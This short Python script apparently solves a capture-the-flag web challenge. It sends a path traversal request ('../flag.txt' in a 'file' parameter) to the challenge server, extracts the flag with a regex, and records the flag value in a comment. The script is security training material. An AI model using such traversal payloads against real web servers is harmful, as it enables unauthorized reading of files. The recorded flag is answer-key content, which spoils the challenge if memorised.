import requests
import re

site = "http://find-me.challs.olicyber.it"

r = requests.get(f"{site}/menu?file=../flag.txt").text
match = re.search(r'flag\{[^\}]+\}', r)
flag = match.group(0)
print(flag)

#flag{h0w_did_y0u_f1nd_m3}